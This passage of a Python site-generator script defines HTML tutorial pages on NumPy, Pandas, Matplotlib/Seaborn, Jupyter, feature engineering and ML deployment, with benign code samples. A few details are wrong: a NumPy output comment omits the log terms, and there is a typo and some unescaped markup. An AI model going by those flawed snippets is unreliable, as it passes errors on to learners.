             "<pre><code>import numpy as np\n\n# Create arrays\narr = np.array([[1, 2, 3], [4, 5, 6]])\nzeros = np.zeros((2, 3), dtype=np.float32)\nrandom = np.random.randn(100, 5)\n\n# Reshape and transform\nflat = arr.ravel()\ntransposed = arr.T\nstacked = np.vstack((arr, [7, 8, 9]))</code></pre>"),
            ("Vectorization and Broadcasting",
             "<p>Vectorization replaces explicit Python loops with NumPy operations that execute at C speed. Instead of <code>for i in range(len(a)): c[i] = a[i] * b[i]</code>, use <code>c = a * b</code>. Vectorized operations include arithmetic (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>), comparison (<code>&gt;</code>, <code>==</code>), and boolean (logical <code>&amp;</code>, <code>|</code>). Universal functions (ufuncs) like <code>np.sqrt()</code>, <code>np.exp()</code>, <code>np.sin()</code>, <code>np.log()</code> process entire arrays element-wise.</p>"
             "<p><strong>Broadcasting</strong> allows operations between arrays of different shapes. Rules: (1) align trailing dimensions, (2) dimensions of size 1 are stretched to match, (3) if dimensions don't match and neither is 1, error. Examples: <code>arr + 5</code> (scalar broadcast), <code>arr + np.array([1, 2, 3])</code> (1D broadcast with 2D), <code>arr[:, np.newaxis] + np.array([1, 2, 3])</code> (explicit broadcast). Broadcasting avoids unnecessary memory allocation for expanded arrays.</p>"
             "<pre><code># Vectorized operations\nimport numpy as np\na = np.array([1, 2, 3])\nb = np.array([4, 5, 6])\nc = a * b + np.log(a)  # [4. , 10. , 18. ]\n\n# Broadcasting examples\na = np.array([[1, 2], [3, 4]])  # (2, 2)\nb = np.array([10, 20])           # (2,)\nprint(a + b)  # [[11, 22], [13, 24]]\n\n# Outer product via broadcasting\ncol = np.arange(5).reshape(5, 1)\nrow = np.arange(5).reshape(1, 5)\nouter = col * row  # 5x5 multiplication table</code></pre>"),
            ("Linear Algebra",
             "<p>NumPy's <code>np.linalg</code> provides core linear algebra operations. Matrix multiplication: <code>np.dot(a, b)</code>, <code>a @ b</code> (Python 3.5+), or <code>np.matmul(a, b)</code>. Compute inverses: <code>np.linalg.inv(A)</code>, determinants: <code>np.linalg.det(A)</code>, eigenvalues: <code>np.linalg.eig(A)</code> (returns eigenvalues vector and eigenvectors matrix). Solve linear systems with <code>np.linalg.solve(A, b)</code> — more efficient and accurate than computing <code>inv(A) @ b</code>.</p>"
             "<p>Advanced operations: <strong>Singular Value Decomposition</strong> (<code>np.linalg.svd</code>) for dimensionality reduction, <strong>QR decomposition</strong> (<code>np.linalg.qr</code>), <strong>Cholesky decomposition</strong> (<code>np.linalg.cholesky</code>), <strong>norm calculation</strong> (<code>np.linalg.norm</code> — supports Frobenius, L1, L2, max norms), and <strong>matrix rank</strong> (<code>np.linalg.matrix_rank</code>). Use <code>np.linalg.cond</code> to compute condition numbers for assessing matrix stability.</p>"
             "<pre><code>import numpy as np\n\nA = np.array([[3, 1], [1, 2]])\nb = np.array([9, 8])\n\n# Solve Ax = b\nx = np.linalg.solve(A, b)  # [2, 3]\n\n# Eigenvalues and eigenvectors\nevals, evecs = np.linalg.eig(A)\n# SVD\nU, S, Vt = np.linalg.svd(A)</code></pre>"),
            ("Performance and Advanced Techniques",
             "<p>NumPy performance optimization: use <strong>views</strong> instead of copies (slicing creates views, <code>.copy()</code> creates copies). Use <strong>fancy indexing</strong> with boolean masks for selective operations: <code>arr[arr &gt; 0]</code> selects positive elements. Use <strong>np.where()</strong> for conditional selection: <code>np.where(arr &gt; 0, arr, 0)</code>. Use <strong>np.clip()</strong> to bound values. Use <strong>np.unique()</strong> for deduplication and counting.</p>"
             "<p>Memory optimization: specify <code>dtype</code> explicitly for large arrays (<code>float32</code> uses half the memory of <code>float64</code>). Use <strong>memory-mapped arrays</strong> (<code>np.memmap</code>) for larger-than-RAM datasets. Use <strong>np.einsum()</strong> for complex tensor contractions with Einstein notation. Use <strong>numba</strong> or <strong>cupy</strong> (GPU arrays) when NumPy vectorization isn't enough. Profile performance with <code>%timeit</code> in Jupyter to identify bottlenecks.</p>"
             "<pre><code># Boolean masking and fancy indexing\ndata = np.random.randn(1000)\npositive = data[data > 0]\nclipped = np.clip(data, -1, 1)\n\n# Einsteon summation for tensor operations\na = np.random.randn(2, 3)\nb = np.random.randn(3, 4)\nc = np.einsum('ij,jk->ik', a, b)  # matrix multiply</code></pre>"),
        ],
        further=[
            ("NumPy Reference", "Official NumPy documentation covering array operations, ufuncs, and linear algebra.", "https://numpy.org/doc/stable/"),
            ("NumPy Tutorial: From Python to NumPy", "Free online book covering NumPy for data science applications.", "https://www.labri.fr/perso/nrougier/from-python-to-numpy/"),
            ("SciPy Lecture Notes", "Scientific Python lecture notes with NumPy, SciPy, and Matplotlib chapters.", "https://scipy-lectures.org/"),
        ],
    )

    build_page(
        title="Pandas Data Analysis",
        filename="pandas-deep-dive.html",
        desc="Master Pandas for data manipulation — DataFrames, groupby operations, merging datasets, time series analysis, and performance optimization.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("DataFrames and Series",
             "<p>Pandas <code>DataFrame</code> is a 2D labeled data structure with rows and columns (like a spreadsheet or SQL table). The <code>Series</code> is a single column. Create DataFrames from dictionaries, CSV, JSON, Excel, or SQL queries: <code>df = pd.read_csv('data.csv')</code>. The <strong>index</strong> labels rows — use meaningful indices (<code>datetime</code>, <code>user_id</code>) for efficient lookups. Inspect data with <code>head()</code>, <code>info()</code>, <code>describe()</code>, <code>dtypes</code>, and <code>shape</code>.</p>"
             "<p>Data cleaning essentials: handle missing values with <code>isna()</code>, <code>fillna(value)</code>, or <code>dropna()</code>. Detect duplicates with <code>duplicated()</code> and remove with <code>drop_duplicates()</code>. Rename columns with <code>rename(columns={'old': 'new'})</code>. Set a column as index with <code>set_index('col')</code>. Use <code>astype()</code> to convert data types. The <code>pipe()</code> method chains multiple data transformations cleanly.</p>"
             "<pre><code>import pandas as pd\n\ndf = pd.read_csv('sales.csv')\ndf['date'] = pd.to_datetime(df['date'])\ndf = df.fillna({'revenue': 0})\ndf = df.drop_duplicates(subset=['order_id'])\ndf['total'] = df['quantity'] * df['price']\n\nprint(df.describe())\nprint(df.groupby('category')['total'].agg(['sum', 'mean', 'count']))</code></pre>"),
            ("GroupBy Operations",
             "<p>The <code>groupby</code> operation follows split-apply-combine: split data into groups, apply a function to each group, and combine results. Use <code>df.groupby('category')['revenue'].sum()</code> for simple aggregation. Multiple aggregations: <code>.agg(['sum', 'mean', 'std'])</code>. Different aggregations per column: <code>.agg({'revenue': 'sum', 'quantity': 'mean', 'product': 'nunique'})</code>.</p>"
             "<p>Advanced groupby: <strong>transform</strong> broadcasts the result back to the original DataFrame shape — <code>df['pct_revenue'] = df['revenue'] / df.groupby('category')['revenue'].transform('sum')</code>. <strong>filter</strong> keeps groups meeting a condition — <code>df.groupby('category').filter(lambda g: g['revenue'].sum() > 1000)</code>. <strong>apply</strong> runs arbitrary functions on each group — powerful but slower than built-in aggregations. Use <strong>resample</strong> for time-based groupby: <code>df.set_index('date').resample('M')['revenue'].sum()</code>.</p>"
             "<pre><code># GroupBy with multiple aggregations\ndf.groupby('region').agg({\n    'revenue': ['sum', 'mean'],\n    'customer_id': 'nunique',\n    'order_id': 'count'\n}).round(2)\n\n# Transform — compute percentage of category\ncategory_total = df.groupby('category')['revenue'].transform('sum')\ndf['pct_of_category'] = (df['revenue'] / category_total * 100).round(2)</code></pre>"),
            ("Merging and Joining",
             "<p>Pandas provides SQL-like joins for combining DataFrames. <code>pd.merge(df1, df2, on='key')</code> performs an inner join. Specify <code>how='left'</code>, <code>'right'</code>, <code>'outer'</code>, or <code>'inner'</code>. For different key column names, use <code>left_on='user_id', right_on='id'</code>. Merge on index with <code>left_index=True</code>. For large merges, ensure keys are sorted and use <code>sort=False</code> to avoid overhead.</p>"
             "<p><strong>Concatenation</strong> stacks DataFrames vertically (<code>pd.concat([df1, df2])</code>) or horizontally (<code>axis=1</code>). Use <code>join='inner'</code> to keep only overlapping columns. <strong>Append</strong> is deprecated — use <code>pd.concat</code> instead. For many small DataFrames, collect them in a list and concat once rather than repeated appends. Use <strong>merge_asof</strong> for time-series joins on nearest timestamps — ideal for aligning sensor readings from different sources.</p>"
             "<pre><code># SQL-style joins\ndf_orders = pd.read_csv('orders.csv')\ndf_customers = pd.read_csv('customers.csv')\n\ndf_merged = df_orders.merge(\n    df_customers[['customer_id', 'name', 'region']],\n    on='customer_id',\n    how='left'\n)\n\n# Time-series nearest join\nprice_changes = df_trades.sort_values('timestamp')\nsensor_readings = df_sensors.sort_values('timestamp')\naligned = pd.merge_asof(sensor_readings, price_changes,\n                         on='timestamp', direction='nearest')</code></pre>"),
            ("Time Series Analysis",
             "<p>Pandas has excellent time series support. Parse dates with <code>pd.to_datetime()</code> or <code>parse_dates=['date']</code> in read functions. Set a DatetimeIndex with <code>set_index('date')</code> to unlock time-based features. Resample data to different frequencies: <code>df.resample('D').mean()</code> (daily), <code>'H'</code> (hourly), <code>'M'</code> (monthly), <code>'Q'</code> (quarterly). Use <strong>rolling windows</strong> for moving averages: <code>df['revenue'].rolling(window=7).mean()</code>.</p>"
             "<p>Shift data with <code>df.shift(1)</code> for previous-period values (lag features for ML). Compute differences with <code>df.diff()</code>. Use <code>df.pct_change()</code> for percentage returns. Date offsets: <code>pd.DateOffset(months=3)</code>, <code>pd.offsets.BDay()</code> (business days). Filter time ranges with string slicing: <code>df['2024-01':'2024-03']</code>. Combine with <strong>groupby</strong> for time-series by category: <code>df.groupby('product').resample('M')['revenue'].sum()</code>.</p>"
             "<pre><code># Time series operations\ndf = pd.read_csv('stock_prices.csv', parse_dates=['date'], index_col='date')\n\n# Resample and rolling\ndf_monthly = df['price'].resample('M').ohlc()\ndf['ma_20'] = df['price'].rolling(20).mean()\ndf['ma_50'] = df['price'].rolling(50).mean()\n\n# Lag features for forecasting\ndf['lag_1'] = df['price'].shift(1)\ndf['lag_7'] = df['price'].shift(7)\ndf['returns'] = df['price'].pct_change()</code></pre>"),
        ],
        further=[
            ("Pandas Documentation", "Official Pandas documentation covering all APIs, user guide, and cookbook recipes.", "https://pandas.pydata.org/docs/"),
            ("Pandas Cheat Sheet", "Quick reference PDF covering common Pandas operations.", "https://pandas.pydata.org/Pandas_Cheat_Sheet.pdf"),
            ("Modern Pandas Book", "Tutorial-style book covering Pandas for data analysis with real-world datasets.", "https://tomaugspurger.github.io/modern-1.html"),
        ],
    )

    build_page(
        title="Data Visualization with Matplotlib & Seaborn",
        filename="matplotlib-seaborn.html",
        desc="Create publication-quality visualizations — Matplotlib fundamentals, Seaborn statistical plots, styling, and dashboard integration.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Matplotlib Fundamentals",
             "<p>Matplotlib is the foundational Python visualization library. The <code>Figure</code> (entire image) contains one or more <code>Axes</code> (individual plots). Basic workflow: <code>fig, ax = plt.subplots()</code>, then call methods like <code>ax.plot(x, y)</code>, <code>ax.scatter(x, y)</code>, <code>ax.bar(x, height)</code>, or <code>ax.hist(data)</code>. Customize with <code>set_xlabel()</code>, <code>set_ylabel()</code>, <code>set_title()</code>, <code>legend()</code>, and <code>grid()</code>.</p>"
             "<p>Subplots allow multiple plots in one figure: <code>fig, axes = plt.subplots(2, 3, figsize=(12, 8))</code> creates a 2x3 grid. Access individual axes with <code>axes[0, 1]</code>. Use <strong>twinx</strong> for dual y-axes: <code>ax2 = ax.twinx()</code>. Save figures with <code>fig.savefig('plot.png', dpi=300, bbox_inches='tight')</code>. The <code>rcParams</code> dictionary controls global styling: font size, figure size, color cycle.</p>"
             "<pre><code>import matplotlib.pyplot as plt\nimport numpy as np\n\nx = np.linspace(0, 10, 100)\nfig, (ax1, ax2) = plt.subplots(1, 2, figsize=(12, 4))\nax1.plot(x, np.sin(x), label='sin(x)', linewidth=2)\nax1.plot(x, np.cos(x), label='cos(x)', linewidth=2)\nax1.set_title('Trigonometric Functions')\nax1.legend()\nax2.scatter(x, np.random.randn(100), alpha=0.5)\nax2.set_title('Random Scatter')\nplt.tight_layout()\nplt.savefig('trig.png', dpi=150)</code></pre>"),
            ("Seaborn Statistical Plots",
             "<p>Seaborn extends Matplotlib with statistical visualizations and beautiful default styles. Key plot types: <code>scatterplot()</code>, <code>lineplot()</code>, <code>barplot()</code>, <code>boxplot()</code> (distribution with quartiles), <code>violinplot()</code> (distribution with KDE), <code>histplot()</code> (histogram with KDE overlay), <code>kdeplot()</code> (smooth density), <code>heatmap()</code> (correlation matrices), <code>pairplot()</code> (pairwise relationships), and <code>jointplot()</code> (bivariate + marginal distributions).</p>"
             "<p>Seaborn works natively with DataFrames — specify data, x, y, hue, col, row parameters. The <strong>hue</strong> parameter adds color-coded categories. <strong>col</strong> and <strong>row</strong> create faceted grids: <code>sns.relplot(data=df, x='date', y='sales', hue='region', col='product', kind='line')</code>. Use <sns.set_theme()> to set style (darkgrid, whitegrid, dark, white, ticks) and context (paper, notebook, talk, poster).</p>"
             "<pre><code>import seaborn as sns\nimport matplotlib.pyplot as plt\n\nsns.set_theme(style='darkgrid', context='notebook')\n\ndf = sns.load_dataset('penguins')\n\n# Categorical plot\nfig, axes = plt.subplots(1, 3, figsize=(15, 4))\nsns.boxplot(data=df, x='species', y='body_mass_g', ax=axes[0])\nsns.violinplot(data=df, x='species', y='flipper_length_mm', ax=axes[1])\nsns.barplot(data=df, x='species', y='bill_length_mm', hue='sex', ax=axes[2])\n\n# Correlation heatmap\nnumerical = df.select_dtypes('number')\nsns.heatmap(numerical.corr(), annot=True, cmap='coolwarm')</code></pre>"),
            ("Customizing Visualizations",
             "<p>Publication-quality visualizations require careful styling. Set global defaults with <code>plt.rcParams.update({'font.size': 12, 'figure.figsize': (8, 5)})</code>. Use <strong>color palettes</strong> — sequential (<code>Blues</code>, <code>Greens</code>), diverging (<code>RdBu</code>, <code>coolwarm</code>), qualitative (<code>Set1</code>, <code>Paired</code>). Create custom palettes with <code>sns.color_palette('husl', 8)</code>. Use <code>sns.move_legend()</code> to reposition legends outside the plot.</p>"
             "<p>Advanced annotation: add text with <code>ax.text(x, y, 'label')</code>, arrows with <code>ax.annotate()</code>, horizontal/vertical lines with <code>axhline()</code> and <code>axvline()</code>, and shaded regions with <code>ax.axhspan()</code>. Use <strong>inset axes</strong> for zoomed-in views. Format tick labels with <code>FuncFormatter</code> for currency, percentages, or dates. Use <strong>seaborn axes-level</strong> vs <strong>figure-level</strong> functions — figure-level (<code>relplot</code>, <code>catplot</code>, <code>displot</code>) create FacetGrids with automatic legends and facet titles.</p>"
             "<pre><code># Custom styled Matplotlib plot\nfig, ax = plt.subplots(figsize=(10, 5))\nax.plot(dates, prices, color='#2563eb', linewidth=2, label='Price')\nax.fill_between(dates, prices, alpha=0.1, color='#2563eb')\nax.axhline(y=100, color='red', linestyle='--', alpha=0.7, label='Target')\nax.annotate('Peak', xy=(peak_date, peak_price),\n            arrowprops=dict(arrowstyle='->', color='black'))\nax.xaxis.set_major_formatter(plt.matplotlib.dates.DateFormatter('%b %Y'))\nplt.xticks(rotation=45)\nplt.tight_layout()</code></pre>"),
            ("Interactive and Dashboard Visualizations",
             "<p>For web-based and interactive visualizations, consider <strong>Plotly</strong> (interactive charts with hover tooltips), <strong>Bokeh</strong> (server-backed dashboards), and <strong>Altair</strong> (declarative Vega-Lite syntax). Matplotlib figures can be embedded in Jupyter with <code>%matplotlib inline</code> or <code>%matplotlib widget</code> for interactive widgets. Use <strong>ipywidgets</strong> for sliders and dropdowns that update plots dynamically.</p>"
             "<p>For production dashboards, <strong>Panel</strong> and <strong>Streamlit</strong> integrate Matplotlib/Seaborn with interactive controls. Convert Matplotlib to interactive with <code>mpld3</code> (HTML export) or <code>plotly-matplotlib</code> converter. Use <strong>HoloViews</strong> for high-level declarative visualization that generates Matplotlib or Bokeh output. For static reports, Matplotlib's <code>PGF</code>/<code>PDF</code> backends produce publication-quality LaTeX-ready figures.</p>"
             "<pre><code># Streamlit dashboard with Matplotlib\nimport streamlit as st\nimport matplotlib.pyplot as plt\n\ncategory = st.selectbox('Select Category', df['category'].unique())\nfiltered = df[df['category'] == category]\n\nfig, ax = plt.subplots()\nax.plot(filtered['date'], filtered['revenue'])\nst.pyplot(fig)</code></pre>"),
        ],
        further=[
            ("Matplotlib Documentation", "Official Matplotlib documentation with gallery, tutorials, and API reference.", "https://matplotlib.org/stable/contents.html"),
            ("Seaborn Documentation", "Official Seaborn docs covering statistical plots, themes, and color palettes.", "https://seaborn.pydata.org/"),
            ("From Data to Viz", "Decision tree for choosing the right visualization for your data.", "https://www.data-to-viz.com/"),
        ],
    )

    build_page(
        title="Jupyter Notebook Mastery",
        filename="jupyter-mastery.html",
        desc="Maximize productivity with Jupyter Notebook — magic commands, extensions, kernels, version control, and sharing workflows.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Cells and Execution Modes",
             "<p>Jupyter Notebook consists of <strong>code cells</strong> (executable Python) and <strong>markdown cells</strong> (rich text with LaTeX). Run a cell with <code>Shift+Enter</code> (run and advance), <code>Ctrl+Enter</code> (run in place), or <code>Alt+Enter</code> (run and insert below). The execution order is shown in brackets — <code>[1]</code>, <code>[2]</code>, <code>[*]</code> (currently running). Important: cells can execute in any order, so <strong>restart and run all</strong> (<code>Kernel > Restart & Run All</code>) to ensure reproducibility.</p>"
             "<p>Markdown cells support headings (<code>#</code> to <code>######</code>), bold/italic, numbered lists, inline code with backticks, tables, images, and links. LaTeX equations in <code>$...$</code> (inline) or <code>$$...$$</code> (display): <code>$E = mc^2$</code>. Use <code>Raw NBConvert</code> cells for unprocessed content (LaTeX source, scripts). Toggle cell line numbers with <code>View > Toggle Line Numbers</code>. Split and merge cells via the <strong>Edit</strong> menu.</p>"
             "<pre><code># Cell execution order matters — bad pattern\n# Cell 1: load data\ndata = load_large_dataset()\n# Cell 2: transform (relies on Cell 1)\ntransformed = transform(data)\n# Best practice: Restart & Run All before finalizing</code></pre>"),
            ("Magic Commands",
             "<p>Magic commands are Jupyter-specific shortcuts prefixed with <code>%</code> (line magic) or <code>%%</code> (cell magic). Essential line magics: <code>%timeit</code> (time execution with statistics), <code>%run script.py</code> (run Python script), <code>%load</code> (load file content into cell), <code>%who</code> (list variables), <code>%whos</code> (detailed variables with types and sizes), <code>%env</code> (environment variables), <code>%pdb</code> (toggle debugger on error), <code>%debug</code> (enter debugger after error).</p>"
             "<p>Cell magics: <code>%%timeit</code> (time entire cell), <code>%%bash</code> (run shell commands), <code>%%capture</code> (capture stdout/stderr), <code>%%writefile filename.py</code> (write cell content to file), <code>%%python3</code> (run with specific kernel), <code>%%html</code> (render HTML), <code>%%latex</code> (render LaTeX), <code>%%javascript</code> (run JS in browser). Use <code>%lsmagic</code> to list all available magics. Custom magics can be created with <code>IPython.core.magic</code>.</p>"
             "<pre><code># Timing and profiling\n%timeit np.linalg.svd(large_matrix)\n%prun -s cumulative pandas_operation()\n\n# Shell integration\n%%bash\ncat /proc/cpuinfo | grep 'model name' | head -1\n\n# Write cell to Python file\n%%writefile utils.py\ndef clean_data(df):\n    return df.dropna().reset_index(drop=True)</code></pre>"),
            ("Extensions and Widgets",
             "<p>Jupyter extensions enhance functionality. Install with <code>pip install jupyter_contrib_nbextensions</code> and enable individual extensions via the Nbextensions tab. Popular extensions: <strong>Table of Contents</strong> (auto-generate nav with collapsible sections), <strong>Collapsible Headings</strong> (fold sections), <strong>Execution Time</strong> (show cell execution duration), <strong>Autopep8</strong> (auto-format code), <strong>Variable Inspector</strong> (GUI variable explorer), <strong>Scratchpad</strong> (temporary code testing).</p>"
             "<p>Jupyter <strong>Widgets</strong> (<code>ipywidgets</code> + <code>widgetsnbextension</code>) add interactive UI controls — sliders (<code>IntSlider</code>), dropdowns (<code>Dropdown</code>), checkboxes, buttons, and file uploads. Widgets callback to Python functions, enabling interactive parameter exploration. Use <code>interact</code> to auto-generate widgets from function arguments: <code>interact(plot_function, x=(-10, 10), color=['red', 'blue'])</code>. Combine with <strong>VBox</strong> and <strong>HBox</strong> for layouts.</p>"
             "<pre><code>import ipywidgets as widgets\nfrom IPython.display import display\n\nslider = widgets.IntSlider(value=5, min=0, max=10, description='N:')\ntext = widgets.HTML(value='Value: 5')\n\ndef update(change):\n    text.value = f'Value: {change[\"new\"]}'\n\nslider.observe(update, names='value')\ndisplay(widgets.VBox([slider, text]))</code></pre>"),
            ("Sharing and Version Control",
             "<p>Share notebooks via <strong>Jupyter nbviewer</strong> (render HTML from GitHub URL), <strong>JupyterLab</strong> (built-in viewer), <strong>Binder</strong> (interactive cloud environment from GitHub repo), or <strong>Voila</strong> (deploy notebooks as web apps). For publishing, convert to clean HTML with <code>jupyter nbconvert --to html notebook.ipynb --TemplateExporter.exclude_input=True</code> to hide code cells.</p>"
             "<p>Version control for notebooks is challenging — JSON formats include execution counts, metadata, and outputs that cause noisy diffs. Use <strong>nbstripout</strong> (pre-commit hook to strip outputs), <strong>jupytext</strong> (save as <code>.py</code> or <code>.md</code> paired with <code>.ipynb</code>), or <strong>ReviewNB</strong> (visual diff for notebooks in GitHub PRs). For collaboration, use <strong>JupyterLab real-time collaboration</strong> (JupyterLab 3.0+) or Google Colab with shared notebooks. Always strip output before committing large visualizations.</p>"
             "<pre><code># nbstripout — clean notebook outputs for git\npip install nbstripout\nnbstripout --install  # install git hook\n\n# jupytext — save as Markdown + .ipynb\npip install jupytext\njupytext --set-formats ipynb,md notebook.ipynb\n\n# Convert to HTML without code\njupyter nbconvert --to html --no-input notebook.ipynb</code></pre>"),
        ],
        further=[
            ("Jupyter Notebook Documentation", "Official documentation for Jupyter Notebook, kernels, and extensions.", "https://jupyter-notebook.readthedocs.io/"),
            ("IPython Magic Commands", "Complete reference of IPython magic commands with examples.", "https://ipython.readthedocs.io/en/stable/interactive/magics.html"),
            ("Jupyter Widgets Documentation", "Documentation for ipywidgets — building interactive notebooks with UI controls.", "https://ipywidgets.readthedocs.io/"),
        ],
    )

    build_page(
        title="Feature Engineering for ML",
        filename="feature-engineering.html",
        desc="Transform raw data into powerful ML features — encoding, scaling, selection, creation, and automated engineering pipelines.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Encoding Categorical Variables",
             "<p>Machine learning models require numerical input. Categorical data must be encoded. <strong>Label Encoding</strong> maps categories to integers (<code>red → 0, blue → 1</code>) — suitable for ordinal data or tree-based models. <strong>One-Hot Encoding</strong> creates binary columns for each category — use <code>pd.get_dummies()</code> or <code>sklearn.preprocessing.OneHotEncoder</code>. For high-cardinality features (&gt;100 categories), use <strong>target encoding</strong> (replace category with mean target value) or <strong>count encoding</strong> (replace with frequency count).</p>"
             "<p>Advanced encoding: <strong>WOE (Weight of Evidence)</strong> for logistic regression, <strong>CatBoost encoding</strong> (ordered target statistics with prior smoothing), and <strong>embedding layers</strong> for neural networks — learn dense vectors for each category. For temporal categorical features, create <strong>rolling aggregations</strong> per category (past 7-day average sales for each store). Always fit encoders on training data only and transform validation/test sets to avoid data leakage.</p>"
             "<pre><code>from sklearn.preprocessing import OneHotEncoder, LabelEncoder\nimport pandas as pd\n\n# One-hot encoding\ndf_encoded = pd.get_dummies(df, columns=['color', 'size'], drop_first=True)\n\n# Target encoding (mean of target per category)\nmean_target = df.groupby('category')['target'].mean()\ndf['category_target_enc'] = df['category'].map(mean_target)\n\n# Count encoding\ndf['category_count'] = df.groupby('category')['category'].transform('count')</code></pre>"),
            ("Scaling and Normalization",
             "<p>Feature scaling ensures all numeric features contribute proportionally to model distance calculations. <strong>Standardization (Z-score)</strong>: <code>(x - mean) / std</code> — produces zero mean, unit variance. Use <code>StandardScaler</code> when features have different units or distributions. <strong>Min-Max Scaling</strong>: <code>(x - min) / (max - min)</code> — scales to [0, 1]. Use <code>MinMaxScaler</code> for bounded features or neural network inputs (activation functions saturate at extremes).</p>"
             "<p><strong>Robust Scaling</strong> uses median and IQR — robust to outliers. <strong>Quantile Transformation</strong> maps features to uniform or normal distribution — handles non-linear relationships. <strong>Power Transformation</strong> (Box-Cox, Yeo-Johnson) makes data more Gaussian. Apply scaling after train/test split to prevent information leakage. Use <code>sklearn.pipeline.Pipeline</code> to chain scaling with model training for clean cross-validation.</p>"
             "<pre><code>from sklearn.preprocessing import StandardScaler, MinMaxScaler, RobustScaler\nfrom sklearn.pipeline import Pipeline\n\n# Scaling comparison\nnumeric = ['age', 'income', 'amount']\n\nscaler = StandardScaler()\nX_train_scaled = scaler.fit_transform(X_train[numeric])\nX_test_scaled = scaler.transform(X_test[numeric])\n\n# Pipeline\npipeline = Pipeline([\n    ('scaler', RobustScaler()),\n    ('model', LogisticRegression())\n])\npipeline.fit(X_train, y_train)</code></pre>"),
            ("Feature Selection",
             "<p>Feature selection removes irrelevant or redundant features to reduce overfitting, improve performance, and speed up training. <strong>Filter methods</strong> rank features by statistical measures — correlation with target (<code>SelectKBest</code> with f_classif or mutual_info), variance threshold (remove constant features), and correlation matrix (remove highly correlated pairs, threshold &gt; 0.95).</p>"
             "<p><strong>Wrapper methods</strong> train models on subsets — recursive feature elimination (RFE) with <code>sklearn.feature_selection.RFE</code>, forward/backward selection, and exhaustive search (computationally expensive). <strong>Embedded methods</strong> select during training — L1 regularization (Lasso) forces less important coefficients to zero, tree-based feature importance (<code>RandomForest.feature_importances_</code>), and feature selection via SHAP values. Use <strong>cross-validated feature selection</strong> to avoid overfitting the selection.</p>"
             "<pre><code>from sklearn.feature_selection import SelectKBest, mutual_info_classif, RFE\nfrom sklearn.ensemble import RandomForestClassifier\n\n# Mutual information selection\nselector = SelectKBest(mutual_info_classif, k=20)\nX_selected = selector.fit_transform(X_train, y_train)\n\n# RFE with Random Forest\nrfe = RFE(RandomForestClassifier(), n_features_to_select=15)\nrfe.fit(X_train, y_train)\nselected_features = X_train.columns[rfe.support_]\n\n# Feature importance from Random Forest\nrf = RandomForestClassifier()\nrf.fit(X_train, y_train)\nimportance = pd.Series(rf.feature_importances_, index=X_train.columns).sort_values()</code></pre>"),
            ("Feature Creation",
             "<p>Creating new features from existing ones often improves model accuracy more than algorithm selection. <strong>Polynomial features</strong>: interaction terms (<code>x1 * x2</code>) and powers (<code>x^2</code>, <code>x^3</code>) — use <code>PolynomialFeatures</code> from sklearn for linear models. <strong>Domain-specific features</strong>: ratios (<code>debt/income</code>), aggregates (<code>avg_purchase_per_user</code>), differences (<code>current - previous</code>), and date components (day_of_week, hour, month, is_weekend).</p>"
             "<p><strong>Text features</strong>: TF-IDF vectors, word counts, sentiment scores, entity extraction. <strong>Time series features</strong>: rolling statistics (7-day mean, 30-day std), lag values, exponentially weighted moving averages, Fourier transforms for cyclical patterns. <strong>Clustering features</strong>: distance to cluster centroids from unsupervised clustering (KMeans). Use <strong>featuretools</strong> for automated feature engineering using entity sets (relational data with deep feature synthesis).</p>"
             "<pre><code>from sklearn.preprocessing import PolynomialFeatures\n\n# Polynomial and interaction features\npoly = PolynomialFeatures(degree=2, interaction_only=True, include_bias=False)\nX_poly = poly.fit_transform(X_num)\n\n# Date feature creation\ndf['hour'] = df['timestamp'].dt.hour\ndf['day_of_week'] = df['timestamp'].dt.dayofweek\ndf['is_weekend'] = df['day_of_week'].isin([5, 6]).astype(int)\ndf['month_sin'] = np.sin(2 * np.pi * df['month'] / 12)\ndf['month_cos'] = np.cos(2 * np.pi * df['month'] / 12)</code></pre>"),
        ],
        further=[
            ("Feature Engineering Book", "Comprehensive book on feature engineering techniques for machine learning.", "https://www.featureengineeringbook.com/"),
            ("Sklearn Feature Selection Guide", "Scikit-learn documentation on feature selection methods.", "https://scikit-learn.org/stable/modules/feature_selection.html"),
            ("Featuretools Documentation", "Automated feature engineering framework for relational and time-series data.", "https://featuretools.alteryx.com/"),
        ],
    )

    build_page(
        title="ML Model Deployment",
        filename="ml-model-deployment.html",
        desc="Deploy machine learning models to production — REST APIs, Docker containers, MLflow tracking, monitoring, and MLOps best practices.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("REST API Serving",
             "<p>Deploy ML models behind a REST API for real-time inference. Use <strong>FastAPI</strong> (modern, fast, async Python) or <strong>Flask</strong> (simpler, widely used). The API accepts input features (JSON), runs model prediction, and returns results. <strong>Pydantic</strong> models validate incoming data and generate OpenAPI documentation automatically. Example endpoint: <code>POST /predict</code> with JSON body <code>{\"features\": [1.2, 3.4, ...]}</code> returns <code>{\"prediction\": 0.95, \"probability\": 0.87}</code>.</p>"
             "<p>Best practices: separate model loading (once at startup) from prediction (per request). Use <strong>async handlers</strong> for non-blocking I/O. Add <strong>health check</strong> endpoint (<code>GET /health</code>) for container orchestrators. <strong>Batch prediction</strong> with array inputs reduces overhead. Implement <strong>input validation</strong> (feature ranges, missing values, data types). Use <strong>model versioning</strong> in the URL path: <code>/v1/predict</code>, <code>/v2/predict</code>, so consumers can migrate incrementally.</p>"
             "<pre><code>from fastapi import FastAPI\nfrom pydantic import BaseModel\nimport joblib\n\napp = FastAPI(title='ML Model API')\nmodel = joblib.load('models/model_v2.pkl')\n\nclass PredictionInput(BaseModel):\n    features: list[float]\n\nclass PredictionOutput(BaseModel):\n    prediction: float\n    probability: float\n\n@app.post('/v1/predict', response_model=PredictionOutput)\nasync def predict(input: PredictionInput):\n    pred = model.predict([input.features])[0]\n    proba = model.predict_proba([input.features])[0][1]\n    return PredictionOutput(prediction=pred, probability=proba)</code></pre>"),
            ("Docker Containerization",
             "<p>Docker packages the model, API code, and dependencies into a portable container. Use a <strong>multi-stage Dockerfile</strong>: first stage installs dependencies (including heavy ML libraries), second stage creates a slim runtime image. Base image: <code>python:3.11-slim</code> for size efficiency. Install ML libraries with <code>--no-cache-dir</code> and clean up build artifacts. Copy only the model file and API code — not training scripts or data.</p>"
